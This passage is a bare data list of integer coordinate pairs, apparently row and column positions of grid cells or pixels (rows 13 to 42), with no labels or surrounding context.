(13,502), (13,503), (13,504), (13,505), (13,506), (13,507), (13,508), (14,5), (14,6), (14,7), (14,8), (14,9), (14,10), (14,11), (14,12), (14,93), (14,94), (14,95), (14,96), (14,97), (14,98), (14,99), (14,100), (14,157), (14,158), (14,159), (14,160), (14,161), (14,162), (14,163), (14,164), (14,165), (14,166), (14,167), (14,168), (14,169), (14,170), (14,171), (14,172), (14,173), (14,174), (14,175), (14,176), (14,177), (14,178), (14,179), (14,180), (14,181), (14,182), (14,183), (14,184), (14,185), (14,186), (14,187), (14,188), (14,213), (14,214), (14,215), (14,216), (14,217), (14,218), (14,219), (14,220), (14,221), (14,222), (14,223), (14,224), (14,225), (14,226), (14,227), (14,228), (14,269), (14,270), (14,271), (14,272), (14,273), (14,274), (14,275), (14,276), (14,293), (14,294), (14,295), (14,296), (14,297), (14,298), (14,299), (14,300), (14,301), (14,302), (14,303), (14,304), (14,305), (14,306), (14,307), (14,308), (14,309), (14,310), (14,311), (14,312), (14,313), (14,314), (14,315), (14,316), (14,317), (14,318), (14,319), (14,320), (14,321), (14,322), (14,323), (14,324), (14,325), (14,326), (14,327), (14,328), (14,329), (14,330), (14,331), (14,332), (14,397), (14,398), (14,399), (14,400), (14,401), (14,402), (14,403), (14,404), (14,405), (14,406), (14,407), (14,408), (14,409), (14,410), (14,411), (14,412), (14,437), (14,438), (14,439), (14,440), (14,441), (14,442), (14,443), (14,444), (14,445), (14,446), (14,447), (14,448), (14,449), (14,450), (14,451), (14,452), (14,461), (14,462), (14,463), (14,464), (14,465), (14,466), (14,467), (14,468), (14,501), (14,502), (14,503), (14,504), (14,505), (14,506), (14,507), (14,508), (15,5), (15,6), (15,7), (15,8), (15,9), (15,10), (15,11), (15,12), (15,93), (15,94), (15,95), (15,96), (15,97), (15,98), (15,99), (15,100), (15,157), (15,158), (15,159), (15,160), (15,161), (15,162), (15,163), (15,164), (15,165), (15,166), (15,167), (15,168), (15,169), (15,170), (15,171), (15,172), (15,173), (15,174), (15,175), (15,176), (15,177), (15,178), (15,179), (15,180), (15,181), (15,182), (15,183), (15,184), (15,185), (15,186), (15,187), (15,188), (15,213), (15,214), (15,215), (15,216), (15,217), (15,218), (15,219), (15,220), (15,221), (15,222), (15,223), (15,224), (15,225), (15,226), (15,227), (15,228), (15,269), (15,270), (15,271), (15,272), (15,273), (15,274), (15,275), (15,276), (15,293), (15,294), (15,295), (15,296), (15,297), (15,298), (15,299), (15,300), (15,301), (15,302), (15,303), (15,304), (15,305), (15,306), (15,307), (15,308), (15,309), (15,310), (15,311), (15,312), (15,313), (15,314), (15,315), (15,316), (15,317), (15,318), (15,319), (15,320), (15,321), (15,322), (15,323), (15,324), (15,325), (15,326), (15,327), (15,328), (15,329), (15,330), (15,331), (15,332), (15,397), (15,398), (15,399), (15,400), (15,401), (15,402), (15,403), (15,404), (15,405), (15,406), (15,407), (15,408), (15,409), (15,410), (15,411), (15,412), (15,437), (15,438), (15,439), (15,440), (15,441), (15,442), (15,443), (15,444), (15,445), (15,446), (15,447), (15,448), (15,449), (15,450), (15,451), (15,452), (15,461), (15,462), (15,463), (15,464), (15,465), (15,466), (15,467), (15,468), (15,501), (15,502), (15,503), (15,504), (15,505), (15,506), (15,507), (15,508), (16,5), (16,6), (16,7), (16,8), (16,9), (16,10), (16,11), (16,12), (16,93), (16,94), (16,95), (16,96), (16,97), (16,98), (16,99), (16,100), (16,149), (16,150), (16,151), (16,152), (16,153), (16,154), (16,155), (16,156), (16,189), (16,190), (16,191), (16,192), (16,193), (16,194), (16,195), (16,196), (16,197), (16,198), (16,199), (16,200), (16,201), (16,202), (16,203), (16,204), (16,221), (16,222), (16,223), (16,224), (16,225), (16,226), (16,227), (16,228), (16,261), (16,262), (16,263), (16,264), (16,265), (16,266), (16,267), (16,268), (16,269), (16,270), (16,271), (16,272), (16,273), (16,274), (16,275), (16,276), (16,293), (16,294), (16,295), (16,296), (16,297), (16,298), (16,299), (16,300), (16,405), (16,406), (16,407), (16,408), (16,409), (16,410), (16,411), (16,412), (16,437), (16,438), (16,439), (16,440), (16,441), (16,442), (16,443), (16,444), (16,461), (16,462), (16,463), (16,464), (16,465), (16,466), (16,467), (16,468), (16,493), (16,494), (16,495), (16,496), (16,497), (16,498), (16,499), (16,500), (16,501), (16,502), (16,503), (16,504), (16,505), (16,506), (16,507), (16,508), (17,5), (17,6), (17,7), (17,8), (17,9), (17,10), (17,11), (17,12), (17,93), (17,94), (17,95), (17,96), (17,97), (17,98), (17,99), (17,100), (17,149), (17,150), (17,151), (17,152), (17,153), (17,154), (17,155), (17,156), (17,189), (17,190), (17,191), (17,192), (17,193), (17,194), (17,195), (17,196), (17,197), (17,198), (17,199), (17,200), (17,201), (17,202), (17,203), (17,204), (17,221), (17,222), (17,223), (17,224), (17,225), (17,226), (17,227), (17,228), (17,261), (17,262), (17,263), (17,264), (17,265), (17,266), (17,267), (17,268), (17,269), (17,270), (17,271), (17,272), (17,273), (17,274), (17,275), (17,276), (17,293), (17,294), (17,295), (17,296), (17,297), (17,298), (17,299), (17,300), (17,405), (17,406), (17,407), (17,408), (17,409), (17,410), (17,411), (17,412), (17,437), (17,438), (17,439), (17,440), (17,441), (17,442), (17,443), (17,444), (17,461), (17,462), (17,463), (17,464), (17,465), (17,466), (17,467), (17,468), (17,493), (17,494), (17,495), (17,496), (17,497), (17,498), (17,499), (17,500), (17,501), (17,502), (17,503), (17,504), (17,505), (17,506), (17,507), (17,508), (18,5), (18,6), (18,7), (18,8), (18,9), (18,10), (18,11), (18,12), (18,93), (18,94), (18,95), (18,96), (18,97), (18,98), (18,99), (18,100), (18,149), (18,150), (18,151), (18,152), (18,153), (18,154), (18,155), (18,156), (18,189), (18,190), (18,191), (18,192), (18,193), (18,194), (18,195), (18,196), (18,197), (18,198), (18,199), (18,200), (18,201), (18,202), (18,203), (18,204), (18,221), (18,222), (18,223), (18,224), (18,225), (18,226), (18,227), (18,228), (18,261), (18,262), (18,263), (18,264), (18,265), (18,266), (18,267), (18,268), (18,269), (18,270), (18,271), (18,272), (18,273), (18,274), (18,275), (18,276), (18,293), (18,294), (18,295), (18,296), (18,297), (18,298), (18,299), (18,300), (18,405), (18,406), (18,407), (18,408), (18,409), (18,410), (18,411), (18,412), (18,437), (18,438), (18,439), (18,440), (18,441), (18,442), (18,443), (18,444), (18,461), (18,462), (18,463), (18,464), (18,465), (18,466), (18,467), (18,468), (18,493), (18,494), (18,495), (18,496), (18,497), (18,498), (18,499), (18,500), (18,501), (18,502), (18,503), (18,504), (18,505), (18,506), (18,507), (18,508), (19,5), (19,6), (19,7), (19,8), (19,9), (19,10), (19,11), (19,12), (19,93), (19,94), (19,95), (19,96), (19,97), (19,98), (19,99), (19,100), (19,149), (19,150), (19,151), (19,152), (19,153), (19,154), (19,155), (19,156), (19,189), (19,190), (19,191), (19,192), (19,193), (19,194), (19,195), (19,196), (19,197), (19,198), (19,199), (19,200), (19,201), (19,202), (19,203), (19,204), (19,221), (19,222), (19,223), (19,224), (19,225), (19,226), (19,227), (19,228), (19,261), (19,262), (19,263), (19,264), (19,265), (19,266), (19,267), (19,268), (19,269), (19,270), (19,271), (19,272), (19,273), (19,274), (19,275), (19,276), (19,293), (19,294), (19,295), (19,296), (19,297), (19,298), (19,299), (19,300), (19,405), (19,406), (19,407), (19,408), (19,409), (19,410), (19,411), (19,412), (19,437), (19,438), (19,439), (19,440), (19,441), (19,442), (19,443), (19,444), (19,461), (19,462), (19,463), (19,464), (19,465), (19,466), (19,467), (19,468), (19,493), (19,494), (19,495), (19,496), (19,497), (19,498), (19,499), (19,500), (19,501), (19,502), (19,503), (19,504), (19,505), (19,506), (19,507), (19,508), (20,5), (20,6), (20,7), (20,8), (20,9), (20,10), (20,11), (20,12), (20,93), (20,94), (20,95), (20,96), (20,97), (20,98), (20,99), (20,100), (20,149), (20,150), (20,151), (20,152), (20,153), (20,154), (20,155), (20,156), (20,189), (20,190), (20,191), (20,192), (20,193), (20,194), (20,195), (20,196), (20,197), (20,198), (20,199), (20,200), (20,201), (20,202), (20,203), (20,204), (20,221), (20,222), (20,223), (20,224), (20,225), (20,226), (20,227), (20,228), (20,261), (20,262), (20,263), (20,264), (20,265), (20,266), (20,267), (20,268), (20,269), (20,270), (20,271), (20,272), (20,273), (20,274), (20,275), (20,276), (20,293), (20,294), (20,295), (20,296), (20,297), (20,298), (20,299), (20,300), (20,405), (20,406), (20,407), (20,408), (20,409), (20,410), (20,411), (20,412), (20,437), (20,438), (20,439), (20,440), (20,441), (20,442), (20,443), (20,444), (20,461), (20,462), (20,463), (20,464), (20,465), (20,466), (20,467), (20,468), (20,493), (20,494), (20,495), (20,496), (20,497), (20,498), (20,499), (20,500), (20,501), (20,502), (20,503), (20,504), (20,505), (20,506), (20,507), (20,508), (21,5), (21,6), (21,7), (21,8), (21,9), (21,10), (21,11), (21,12), (21,93), (21,94), (21,95), (21,96), (21,97), (21,98), (21,99), (21,100), (21,149), (21,150), (21,151), (21,152), (21,153), (21,154), (21,155), (21,156), (21,189), (21,190), (21,191), (21,192), (21,193), (21,194), (21,195), (21,196), (21,197), (21,198), (21,199), (21,200), (21,201), (21,202), (21,203), (21,204), (21,221), (21,222), (21,223), (21,224), (21,225), (21,226), (21,227), (21,228), (21,261), (21,262), (21,263), (21,264), (21,265), (21,266), (21,267), (21,268), (21,269), (21,270), (21,271), (21,272), (21,273), (21,274), (21,275), (21,276), (21,293), (21,294), (21,295), (21,296), (21,297), (21,298), (21,299), (21,300), (21,405), (21,406), (21,407), (21,408), (21,409), (21,410), (21,411), (21,412), (21,437), (21,438), (21,439), (21,440), (21,441), (21,442), (21,443), (21,444), (21,461), (21,462), (21,463), (21,464), (21,465), (21,466), (21,467), (21,468), (21,493), (21,494), (21,495), (21,496), (21,497), (21,498), (21,499), (21,500), (21,501), (21,502), (21,503), (21,504), (21,505), (21,506), (21,507), (21,508), (22,5), (22,6), (22,7), (22,8), (22,9), (22,10), (22,11), (22,12), (22,93), (22,94), (22,95), (22,96), (22,97), (22,98), (22,99), (22,100), (22,149), (22,150), (22,151), (22,152), (22,153), (22,154), (22,155), (22,156), (22,189), (22,190), (22,191), (22,192), (22,193), (22,194), (22,195), (22,196), (22,197), (22,198), (22,199), (22,200), (22,201), (22,202), (22,203), (22,204), (22,221), (22,222), (22,223), (22,224), (22,225), (22,226), (22,227), (22,228), (22,261), (22,262), (22,263), (22,264), (22,265), (22,266), (22,267), (22,268), (22,269), (22,270), (22,271), (22,272), (22,273), (22,274), (22,275), (22,276), (22,293), (22,294), (22,295), (22,296), (22,297), (22,298), (22,299), (22,300), (22,405), (22,406), (22,407), (22,408), (22,409), (22,410), (22,411), (22,412), (22,437), (22,438), (22,439), (22,440), (22,441), (22,442), (22,443), (22,444), (22,461), (22,462), (22,463), (22,464), (22,465), (22,466), (22,467), (22,468), (22,493), (22,494), (22,495), (22,496), (22,497), (22,498), (22,499), (22,500), (22,501), (22,502), (22,503), (22,504), (22,505), (22,506), (22,507), (22,508), (23,5), (23,6), (23,7), (23,8), (23,9), (23,10), (23,11), (23,12), (23,93), (23,94), (23,95), (23,96), (23,97), (23,98), (23,99), (23,100), (23,149), (23,150), (23,151), (23,152), (23,153), (23,154), (23,155), (23,156), (23,189), (23,190), (23,191), (23,192), (23,193), (23,194), (23,195), (23,196), (23,197), (23,198), (23,199), (23,200), (23,201), (23,202), (23,203), (23,204), (23,221), (23,222), (23,223), (23,224), (23,225), (23,226), (23,227), (23,228), (23,261), (23,262), (23,263), (23,264), (23,265), (23,266), (23,267), (23,268), (23,269), (23,270), (23,271), (23,272), (23,273), (23,274), (23,275), (23,276), (23,293), (23,294), (23,295), (23,296), (23,297), (23,298), (23,299), (23,300), (23,405), (23,406), (23,407), (23,408), (23,409), (23,410), (23,411), (23,412), (23,437), (23,438), (23,439), (23,440), (23,441), (23,442), (23,443), (23,444), (23,461), (23,462), (23,463), (23,464), (23,465), (23,466), (23,467), (23,468), (23,493), (23,494), (23,495), (23,496), (23,497), (23,498), (23,499), (23,500), (23,501), (23,502), (23,503), (23,504), (23,505), (23,506), (23,507), (23,508), (24,5), (24,6), (24,7), (24,8), (24,9), (24,10), (24,11), (24,12), (24,93), (24,94), (24,95), (24,96), (24,97), (24,98), (24,99), (24,100), (24,141), (24,142), (24,143), (24,144), (24,145), (24,146), (24,147), (24,148), (24,197), (24,198), (24,199), (24,200), (24,201), (24,202), (24,203), (24,204), (24,221), (24,222), (24,223), (24,224), (24,225), (24,226), (24,227), (24,228), (24,261), (24,262), (24,263), (24,264), (24,265), (24,266), (24,267), (24,268), (24,293), (24,294), (24,295), (24,296), (24,297), (24,298), (24,299), (24,300), (24,413), (24,414), (24,415), (24,416), (24,417), (24,418), (24,419), (24,420), (24,429), (24,430), (24,431), (24,432), (24,433), (24,434), (24,435), (24,436), (24,469), (24,470), (24,471), (24,472), (24,473), (24,474), (24,475), (24,476), (24,493), (24,494), (24,495), (24,496), (24,497), (24,498), (24,499), (24,500), (25,5), (25,6), (25,7), (25,8), (25,9), (25,10), (25,11), (25,12), (25,93), (25,94), (25,95), (25,96), (25,97), (25,98), (25,99), (25,100), (25,141), (25,142), (25,143), (25,144), (25,145), (25,146), (25,147), (25,148), (25,197), (25,198), (25,199), (25,200), (25,201), (25,202), (25,203), (25,204), (25,221), (25,222), (25,223), (25,224), (25,225), (25,226), (25,227), (25,228), (25,261), (25,262), (25,263), (25,264), (25,265), (25,266), (25,267), (25,268), (25,293), (25,294), (25,295), (25,296), (25,297), (25,298), (25,299), (25,300), (25,413), (25,414), (25,415), (25,416), (25,417), (25,418), (25,419), (25,420), (25,429), (25,430), (25,431), (25,432), (25,433), (25,434), (25,435), (25,436), (25,469), (25,470), (25,471), (25,472), (25,473), (25,474), (25,475), (25,476), (25,493), (25,494), (25,495), (25,496), (25,497), (25,498), (25,499), (25,500), (26,5), (26,6), (26,7), (26,8), (26,9), (26,10), (26,11), (26,12), (26,93), (26,94), (26,95), (26,96), (26,97), (26,98), (26,99), (26,100), (26,141), (26,142), (26,143), (26,144), (26,145), (26,146), (26,147), (26,148), (26,197), (26,198), (26,199), (26,200), (26,201), (26,202), (26,203), (26,204), (26,221), (26,222), (26,223), (26,224), (26,225), (26,226), (26,227), (26,228), (26,261), (26,262), (26,263), (26,264), (26,265), (26,266), (26,267), (26,268), (26,293), (26,294), (26,295), (26,296), (26,297), (26,298), (26,299), (26,300), (26,413), (26,414), (26,415), (26,416), (26,417), (26,418), (26,419), (26,420), (26,429), (26,430), (26,431), (26,432), (26,433), (26,434), (26,435), (26,436), (26,469), (26,470), (26,471), (26,472), (26,473), (26,474), (26,475), (26,476), (26,493), (26,494), (26,495), (26,496), (26,497), (26,498), (26,499), (26,500), (27,5), (27,6), (27,7), (27,8), (27,9), (27,10), (27,11), (27,12), (27,93), (27,94), (27,95), (27,96), (27,97), (27,98), (27,99), (27,100), (27,141), (27,142), (27,143), (27,144), (27,145), (27,146), (27,147), (27,148), (27,197), (27,198), (27,199), (27,200), (27,201), (27,202), (27,203), (27,204), (27,221), (27,222), (27,223), (27,224), (27,225), (27,226), (27,227), (27,228), (27,261), (27,262), (27,263), (27,264), (27,265), (27,266), (27,267), (27,268), (27,293), (27,294), (27,295), (27,296), (27,297), (27,298), (27,299), (27,300), (27,413), (27,414), (27,415), (27,416), (27,417), (27,418), (27,419), (27,420), (27,429), (27,430), (27,431), (27,432), (27,433), (27,434), (27,435), (27,436), (27,469), (27,470), (27,471), (27,472), (27,473), (27,474), (27,475), (27,476), (27,493), (27,494), (27,495), (27,496), (27,497), (27,498), (27,499), (27,500), (28,5), (28,6), (28,7), (28,8), (28,9), (28,10), (28,11), (28,12), (28,93), (28,94), (28,95), (28,96), (28,97), (28,98), (28,99), (28,100), (28,141), (28,142), (28,143), (28,144), (28,145), (28,146), (28,147), (28,148), (28,197), (28,198), (28,199), (28,200), (28,201), (28,202), (28,203), (28,204), (28,221), (28,222), (28,223), (28,224), (28,225), (28,226), (28,227), (28,228), (28,261), (28,262), (28,263), (28,264), (28,265), (28,266), (28,267), (28,268), (28,293), (28,294), (28,295), (28,296), (28,297), (28,298), (28,299), (28,300), (28,413), (28,414), (28,415), (28,416), (28,417), (28,418), (28,419), (28,420), (28,429), (28,430), (28,431), (28,432), (28,433), (28,434), (28,435), (28,436), (28,469), (28,470), (28,471), (28,472), (28,473), (28,474), (28,475), (28,476), (28,493), (28,494), (28,495), (28,496), (28,497), (28,498), (28,499), (28,500), (29,5), (29,6), (29,7), (29,8), (29,9), (29,10), (29,11), (29,12), (29,93), (29,94), (29,95), (29,96), (29,97), (29,98), (29,99), (29,100), (29,141), (29,142), (29,143), (29,144), (29,145), (29,146), (29,147), (29,148), (29,197), (29,198), (29,199), (29,200), (29,201), (29,202), (29,203), (29,204), (29,221), (29,222), (29,223), (29,224), (29,225), (29,226), (29,227), (29,228), (29,261), (29,262), (29,263), (29,264), (29,265), (29,266), (29,267), (29,268), (29,293), (29,294), (29,295), (29,296), (29,297), (29,298), (29,299), (29,300), (29,413), (29,414), (29,415), (29,416), (29,417), (29,418), (29,419), (29,420), (29,429), (29,430), (29,431), (29,432), (29,433), (29,434), (29,435), (29,436), (29,469), (29,470), (29,471), (29,472), (29,473), (29,474), (29,475), (29,476), (29,493), (29,494), (29,495), (29,496), (29,497), (29,498), (29,499), (29,500), (30,5), (30,6), (30,7), (30,8), (30,9), (30,10), (30,11), (30,12), (30,93), (30,94), (30,95), (30,96), (30,97), (30,98), (30,99), (30,100), (30,141), (30,142), (30,143), (30,144), (30,145), (30,146), (30,147), (30,148), (30,197), (30,198), (30,199), (30,200), (30,201), (30,202), (30,203), (30,204), (30,221), (30,222), (30,223), (30,224), (30,225), (30,226), (30,227), (30,228), (30,261), (30,262), (30,263), (30,264), (30,265), (30,266), (30,267), (30,268), (30,293), (30,294), (30,295), (30,296), (30,297), (30,298), (30,299), (30,300), (30,413), (30,414), (30,415), (30,416), (30,417), (30,418), (30,419), (30,420), (30,429), (30,430), (30,431), (30,432), (30,433), (30,434), (30,435), (30,436), (30,469), (30,470), (30,471), (30,472), (30,473), (30,474), (30,475), (30,476), (30,493), (30,494), (30,495), (30,496), (30,497), (30,498), (30,499), (30,500), (31,5), (31,6), (31,7), (31,8), (31,9), (31,10), (31,11), (31,12), (31,93), (31,94), (31,95), (31,96), (31,97), (31,98), (31,99), (31,100), (31,141), (31,142), (31,143), (31,144), (31,145), (31,146), (31,147), (31,148), (31,197), (31,198), (31,199), (31,200), (31,201), (31,202), (31,203), (31,204), (31,221), (31,222), (31,223), (31,224), (31,225), (31,226), (31,227), (31,228), (31,261), (31,262), (31,263), (31,264), (31,265), (31,266), (31,267), (31,268), (31,293), (31,294), (31,295), (31,296), (31,297), (31,298), (31,299), (31,300), (31,413), (31,414), (31,415), (31,416), (31,417), (31,418), (31,419), (31,420), (31,429), (31,430), (31,431), (31,432), (31,433), (31,434), (31,435), (31,436), (31,469), (31,470), (31,471), (31,472), (31,473), (31,474), (31,475), (31,476), (31,493), (31,494), (31,495), (31,496), (31,497), (31,498), (31,499), (31,500), (32,5), (32,6), (32,7), (32,8), (32,9), (32,10), (32,11), (32,12), (32,93), (32,94), (32,95), (32,96), (32,97), (32,98), (32,99), (32,100), (32,141), (32,142), (32,143), (32,144), (32,145), (32,146), (32,147), (32,148), (32,197), (32,198), (32,199), (32,200), (32,201), (32,202), (32,203), (32,204), (32,221), (32,222), (32,223), (32,224), (32,225), (32,226), (32,227), (32,228), (32,229), (32,230), (32,231), (32,232), (32,233), (32,234), (32,235), (32,236), (32,261), (32,262), (32,263), (32,264), (32,265), (32,266), (32,267), (32,268), (32,293), (32,294), (32,295), (32,296), (32,297), (32,298), (32,299), (32,300), (32,413), (32,414), (32,415), (32,416), (32,417), (32,418), (32,419), (32,420), (32,421), (32,422), (32,423), (32,424), (32,425), (32,426), (32,427), (32,428), (32,429), (32,430), (32,431), (32,432), (32,433), (32,434), (32,435), (32,436), (32,469), (32,470), (32,471), (32,472), (32,473), (32,474), (32,475), (32,476), (32,485), (32,486), (32,487), (32,488), (32,489), (32,490), (32,491), (32,492), (33,5), (33,6), (33,7), (33,8), (33,9), (33,10), (33,11), (33,12), (33,93), (33,94), (33,95), (33,96), (33,97), (33,98), (33,99), (33,100), (33,141), (33,142), (33,143), (33,144), (33,145), (33,146), (33,147), (33,148), (33,197), (33,198), (33,199), (33,200), (33,201), (33,202), (33,203), (33,204), (33,221), (33,222), (33,223), (33,224), (33,225), (33,226), (33,227), (33,228), (33,229), (33,230), (33,231), (33,232), (33,233), (33,234), (33,235), (33,236), (33,261), (33,262), (33,263), (33,264), (33,265), (33,266), (33,267), (33,268), (33,293), (33,294), (33,295), (33,296), (33,297), (33,298), (33,299), (33,300), (33,413), (33,414), (33,415), (33,416), (33,417), (33,418), (33,419), (33,420), (33,421), (33,422), (33,423), (33,424), (33,425), (33,426), (33,427), (33,428), (33,429), (33,430), (33,431), (33,432), (33,433), (33,434), (33,435), (33,436), (33,469), (33,470), (33,471), (33,472), (33,473), (33,474), (33,475), (33,476), (33,485), (33,486), (33,487), (33,488), (33,489), (33,490), (33,491), (33,492), (34,5), (34,6), (34,7), (34,8), (34,9), (34,10), (34,11), (34,12), (34,93), (34,94), (34,95), (34,96), (34,97), (34,98), (34,99), (34,100), (34,141), (34,142), (34,143), (34,144), (34,145), (34,146), (34,147), (34,148), (34,197), (34,198), (34,199), (34,200), (34,201), (34,202), (34,203), (34,204), (34,221), (34,222), (34,223), (34,224), (34,225), (34,226), (34,227), (34,228), (34,229), (34,230), (34,231), (34,232), (34,233), (34,234), (34,235), (34,236), (34,261), (34,262), (34,263), (34,264), (34,265), (34,266), (34,267), (34,268), (34,293), (34,294), (34,295), (34,296), (34,297), (34,298), (34,299), (34,300), (34,413), (34,414), (34,415), (34,416), (34,417), (34,418), (34,419), (34,420), (34,421), (34,422), (34,423), (34,424), (34,425), (34,426), (34,427), (34,428), (34,429), (34,430), (34,431), (34,432), (34,433), (34,434), (34,435), (34,436), (34,469), (34,470), (34,471), (34,472), (34,473), (34,474), (34,475), (34,476), (34,485), (34,486), (34,487), (34,488), (34,489), (34,490), (34,491), (34,492), (35,5), (35,6), (35,7), (35,8), (35,9), (35,10), (35,11), (35,12), (35,93), (35,94), (35,95), (35,96), (35,97), (35,98), (35,99), (35,100), (35,141), (35,142), (35,143), (35,144), (35,145), (35,146), (35,147), (35,148), (35,197), (35,198), (35,199), (35,200), (35,201), (35,202), (35,203), (35,204), (35,221), (35,222), (35,223), (35,224), (35,225), (35,226), (35,227), (35,228), (35,229), (35,230), (35,231), (35,232), (35,233), (35,234), (35,235), (35,236), (35,261), (35,262), (35,263), (35,264), (35,265), (35,266), (35,267), (35,268), (35,293), (35,294), (35,295), (35,296), (35,297), (35,298), (35,299), (35,300), (35,413), (35,414), (35,415), (35,416), (35,417), (35,418), (35,419), (35,420), (35,421), (35,422), (35,423), (35,424), (35,425), (35,426), (35,427), (35,428), (35,429), (35,430), (35,431), (35,432), (35,433), (35,434), (35,435), (35,436), (35,469), (35,470), (35,471), (35,472), (35,473), (35,474), (35,475), (35,476), (35,485), (35,486), (35,487), (35,488), (35,489), (35,490), (35,491), (35,492), (36,5), (36,6), (36,7), (36,8), (36,9), (36,10), (36,11), (36,12), (36,93), (36,94), (36,95), (36,96), (36,97), (36,98), (36,99), (36,100), (36,141), (36,142), (36,143), (36,144), (36,145), (36,146), (36,147), (36,148), (36,197), (36,198), (36,199), (36,200), (36,201), (36,202), (36,203), (36,204), (36,221), (36,222), (36,223), (36,224), (36,225), (36,226), (36,227), (36,228), (36,229), (36,230), (36,231), (36,232), (36,233), (36,234), (36,235), (36,236), (36,261), (36,262), (36,263), (36,264), (36,265), (36,266), (36,267), (36,268), (36,293), (36,294), (36,295), (36,296), (36,297), (36,298), (36,299), (36,300), (36,413), (36,414), (36,415), (36,416), (36,417), (36,418), (36,419), (36,420), (36,421), (36,422), (36,423), (36,424), (36,425), (36,426), (36,427), (36,428), (36,429), (36,430), (36,431), (36,432), (36,433), (36,434), (36,435), (36,436), (36,469), (36,470), (36,471), (36,472), (36,473), (36,474), (36,475), (36,476), (36,485), (36,486), (36,487), (36,488), (36,489), (36,490), (36,491), (36,492), (37,5), (37,6), (37,7), (37,8), (37,9), (37,10), (37,11), (37,12), (37,93), (37,94), (37,95), (37,96), (37,97), (37,98), (37,99), (37,100), (37,141), (37,142), (37,143), (37,144), (37,145), (37,146), (37,147), (37,148), (37,197), (37,198), (37,199), (37,200), (37,201), (37,202), (37,203), (37,204), (37,221), (37,222), (37,223), (37,224), (37,225), (37,226), (37,227), (37,228), (37,229), (37,230), (37,231), (37,232), (37,233), (37,234), (37,235), (37,236), (37,261), (37,262), (37,263), (37,264), (37,265), (37,266), (37,267), (37,268), (37,293), (37,294), (37,295), (37,296), (37,297), (37,298), (37,299), (37,300), (37,413), (37,414), (37,415), (37,416), (37,417), (37,418), (37,419), (37,420), (37,421), (37,422), (37,423), (37,424), (37,425), (37,426), (37,427), (37,428), (37,429), (37,430), (37,431), (37,432), (37,433), (37,434), (37,435), (37,436), (37,469), (37,470), (37,471), (37,472), (37,473), (37,474), (37,475), (37,476), (37,485), (37,486), (37,487), (37,488), (37,489), (37,490), (37,491), (37,492), (38,5), (38,6), (38,7), (38,8), (38,9), (38,10), (38,11), (38,12), (38,93), (38,94), (38,95), (38,96), (38,97), (38,98), (38,99), (38,100), (38,141), (38,142), (38,143), (38,144), (38,145), (38,146), (38,147), (38,148), (38,197), (38,198), (38,199), (38,200), (38,201), (38,202), (38,203), (38,204), (38,221), (38,222), (38,223), (38,224), (38,225), (38,226), (38,227), (38,228), (38,229), (38,230), (38,231), (38,232), (38,233), (38,234), (38,235), (38,236), (38,261), (38,262), (38,263), (38,264), (38,265), (38,266), (38,267), (38,268), (38,293), (38,294), (38,295), (38,296), (38,297), (38,298), (38,299), (38,300), (38,413), (38,414), (38,415), (38,416), (38,417), (38,418), (38,419), (38,420), (38,421), (38,422), (38,423), (38,424), (38,425), (38,426), (38,427), (38,428), (38,429), (38,430), (38,431), (38,432), (38,433), (38,434), (38,435), (38,436), (38,469), (38,470), (38,471), (38,472), (38,473), (38,474), (38,475), (38,476), (38,485), (38,486), (38,487), (38,488), (38,489), (38,490), (38,491), (38,492), (39,5), (39,6), (39,7), (39,8), (39,9), (39,10), (39,11), (39,12), (39,93), (39,94), (39,95), (39,96), (39,97), (39,98), (39,99), (39,100), (39,141), (39,142), (39,143), (39,144), (39,145), (39,146), (39,147), (39,148), (39,197), (39,198), (39,199), (39,200), (39,201), (39,202), (39,203), (39,204), (39,221), (39,222), (39,223), (39,224), (39,225), (39,226), (39,227), (39,228), (39,229), (39,230), (39,231), (39,232), (39,233), (39,234), (39,235), (39,236), (39,261), (39,262), (39,263), (39,264), (39,265), (39,266), (39,267), (39,268), (39,293), (39,294), (39,295), (39,296), (39,297), (39,298), (39,299), (39,300), (39,413), (39,414), (39,415), (39,416), (39,417), (39,418), (39,419), (39,420), (39,421), (39,422), (39,423), (39,424), (39,425), (39,426), (39,427), (39,428), (39,429), (39,430), (39,431), (39,432), (39,433), (39,434), (39,435), (39,436), (39,469), (39,470), (39,471), (39,472), (39,473), (39,474), (39,475), (39,476), (39,485), (39,486), (39,487), (39,488), (39,489), (39,490), (39,491), (39,492), (40,5), (40,6), (40,7), (40,8), (40,9), (40,10), (40,11), (40,12), (40,93), (40,94), (40,95), (40,96), (40,97), (40,98), (40,99), (40,100), (40,141), (40,142), (40,143), (40,144), (40,145), (40,146), (40,147), (40,148), (40,197), (40,198), (40,199), (40,200), (40,201), (40,202), (40,203), (40,204), (40,229), (40,230), (40,231), (40,232), (40,233), (40,234), (40,235), (40,236), (40,253), (40,254), (40,255), (40,256), (40,257), (40,258), (40,259), (40,260), (40,293), (40,294), (40,295), (40,296), (40,297), (40,298), (40,299), (40,300), (40,301), (40,302), (40,303), (40,304), (40,305), (40,306), (40,307), (40,308), (40,309), (40,310), (40,311), (40,312), (40,313), (40,314), (40,315), (40,316), (40,317), (40,318), (40,319), (40,320), (40,321), (40,322), (40,323), (40,324), (40,421), (40,422), (40,423), (40,424), (40,425), (40,426), (40,427), (40,428), (40,477), (40,478), (40,479), (40,480), (40,481), (40,482), (40,483), (40,484), (40,485), (40,486), (40,487), (40,488), (40,489), (40,490), (40,491), (40,492), (41,5), (41,6), (41,7), (41,8), (41,9), (41,10), (41,11), (41,12), (41,93), (41,94), (41,95), (41,96), (41,97), (41,98), (41,99), (41,100), (41,141), (41,142), (41,143), (41,144), (41,145), (41,146), (41,147), (41,148), (41,197), (41,198), (41,199), (41,200), (41,201), (41,202), (41,203), (41,204), (41,229), (41,230), (41,231), (41,232), (41,233), (41,234), (41,235), (41,236), (41,253), (41,254), (41,255), (41,256), (41,257), (41,258), (41,259), (41,260), (41,293), (41,294), (41,295), (41,296), (41,297), (41,298), (41,299), (41,300), (41,301), (41,302), (41,303), (41,304), (41,305), (41,306), (41,307), (41,308), (41,309), (41,310), (41,311), (41,312), (41,313), (41,314), (41,315), (41,316), (41,317), (41,318), (41,319), (41,320), (41,321), (41,322), (41,323), (41,324), (41,421), (41,422), (41,423), (41,424), (41,425), (41,426), (41,427), (41,428), (41,477), (41,478), (41,479), (41,480), (41,481), (41,482), (41,483), (41,484), (41,485), (41,486), (41,487), (41,488), (41,489), (41,490), (41,491), (41,492), (42,5), (42,6), (42,7), (42,8), (42,9), (42,10), (42,11), (42,12), (42,93), (42,94), (42,95), (42,96), (42,97), (42,98), (42,99), (42,100), (42,141), (42,142), (42,143), (42,144), (42,145), (42,146), (42,147), (42,148), (42,197), (42,198), (42,199), (42,200), (42,201), (42,202), (42,203), (42,204), 